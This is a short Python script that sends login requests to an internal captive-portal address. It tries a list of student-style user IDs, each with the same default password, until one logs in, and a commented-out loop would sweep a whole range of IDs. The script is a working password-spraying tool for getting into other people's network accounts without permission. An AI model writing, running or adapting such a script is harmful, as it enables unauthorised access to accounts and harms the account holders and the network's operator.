import urllib.request
import re
import time 

host_url = 'http://172.16.0.30:8090/httpclient.html'
username = ['4122','4155','4338','5070','5365','5428','5510','6011','6160','6100','6160','6501','6542','6632','6663','6684','6784','6754','6869','6870','6877','6913']

def user_validity(num):
    try:
            req = urllib.request.Request(host_url)
            data = 'mode=191&username=f201'+username[num]+'&password=bits@123&a=1355344698415' 
            data = data.encode('utf-8')
            get = urllib.request.urlopen(host_url,data)
            getData = get.read()
            getData = getData.decode('ascii')
            message = re.findall(r'<message>(.*?)</message>',str(getData))
            return message[0]
        
    except urllib.error.URLError as err:
            print(str(err))


num = 0
while(1):
    message = user_validity(num)
    if(message == '<![CDATA[You have successfully logged in]]>'):
        print('f201'+username[num]+'= CONNECTED')
        break
    else:
        print('f201'+username[num]+'= FAILED CONNECTION'+' Reason ='+message)
        num=num+1

'''while(num<=20171800):
    message = user_validity(num)
    if(message == '<![CDATA[You have successfully logged in]]>'):
        print('f'+str(num))
    num=num+1'''




    

    
